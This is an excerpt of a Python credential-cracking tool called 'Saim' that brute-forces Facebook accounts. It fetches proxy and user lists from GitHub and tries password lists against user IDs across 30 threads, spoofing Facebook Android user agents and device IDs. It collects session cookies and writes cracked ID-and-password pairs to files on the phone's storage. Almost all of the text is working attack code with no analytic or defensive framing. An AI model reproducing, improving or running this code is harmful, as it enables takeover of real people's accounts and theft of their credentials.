...
try:
	prox= requests.get('https://github.com/JANU5226/CHILL/blob/main/chill.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print('\x1b[1;92m[√] WeLCoMe To SAIM o WorLD...')
...
android_models=[]
try:
	xx = requests.get('https://github.com/JANU5226/CHILL/blob/main/chill.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://github.com/JANU5226/CHILL/blob/main/chill.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
...
/33[1;31m  ╭━━━〔S A I M  ⁩〕━━━┈⊷
\x1b[1;97m┃✵╭──────────────
\x1b[1;97m┃✵│ ONWER ✓ MR Saim_302
\x1b[1;97m┃✵│ GITHUB ✓ JANU5226
\x1b[1;97m┃✵│ TOOLS  ✓ RANDOM
\x1b[1;97m┃✵│ TEAM   ✓ HLPRS ANYONE
/33[1;31m. ┃✵│ CREATE ✓ Saim 
\x1b[1;97m┃✵│ STATUS ✓ PAID
\x1b[1;97m┃✵│ BROTHER ✓ DP JOKER 
\x1b[1;97m┃✵│ FACEBOOK ✓ Saim ktk
\x1b[1;97m┃✵│ VERSION ✓ v4.3.8
\x1b[1;97m┃✵╰──────────────
\x1b[1;97m╰━━━━━━━━━━━━━━━┈⊷"""
def linex():
	print('\033[1;37m=======================')
...
def clear():
       # os.system('xdg-open https://chat.whatsapp.com/IydEH4gtd50EM1kVu9akBc')
       # return None
        os.system('clear')
        print(logo)
loop=0
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;37m Saim STARTED...\033[1;37m")
                                        linex()
                                        for user in fo:
...
def ffb(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,h"
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [Saim-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Saim ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/15.0.0.3960;[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Saim-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open('/sdcard/trt-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Saim-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [Saim-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Saim-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
